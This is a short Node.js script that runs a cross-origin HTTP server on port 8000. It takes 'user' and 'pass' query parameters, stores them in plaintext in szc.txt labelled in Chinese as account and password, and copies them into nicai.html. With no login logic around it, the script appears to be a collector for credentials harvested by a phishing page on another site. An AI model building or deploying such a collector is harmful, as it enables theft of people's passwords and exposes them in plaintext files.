var http=require('http');
var url=require('url');
var fs=require('fs');
http.createServer(function(req,res){
    res.setHeader('Access-Control-Allow-Origin','*');
    var json = url.parse(req.url,true).query;
    fs.writeFile('szc.txt','账号：'+json.user+'密码：'+json.pass,function (err) {
       if (err) throw err
    })
    fs.readFile('szc.txt','utf-8',function (err,data) {
        console.log(data)
       fs.writeFile('nicai.html',data,function (err) {
          if(err) throw err
       })
       console.log('ok')
    })
    res.end();

}).listen(8000)
